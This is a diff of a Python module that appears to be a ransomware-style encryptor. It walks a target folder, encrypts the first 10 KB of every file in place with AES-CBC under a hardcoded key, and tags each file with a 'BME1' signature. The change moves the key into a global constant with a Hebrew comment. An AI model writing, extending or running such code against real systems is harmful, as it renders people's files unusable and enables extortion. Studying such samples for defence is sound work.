@@ -3,12 +3,12 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from modules.utils import log_action
 
-key = bytes.fromhex("3031323334353637383961626364656630313233343536373839616263646566")
+# מפתח קבוע (32 bytes == 256bit)
+KEY = bytes.fromhex("3031323334353637383961626364656630313233343536373839616263646566")
 SIGNATURE = b"BME1"
 CHUNK_SIZE = 10 * 1024
 
-def encrypt_files(key: bytes, folder: str = "./target"):
-
+def encrypt_files(folder: str = "./target"):
     for root, _, files in os.walk(folder):
         for name in files:
             path = os.path.join(root, name)
@@ -20,7 +20,7 @@ def encrypt_files(key: bytes, folder: str = "./target"):
                 tail = data[CHUNK_SIZE:]
 
                 iv = os.urandom(16)
-                cipher = AES.new(key, AES.MODE_CBC, iv)
+                cipher = AES.new(KEY, AES.MODE_CBC, iv)
                 encrypted_header = cipher.encrypt(pad(header, AES.block_size))
 
                 with open(path, "wb") as f:
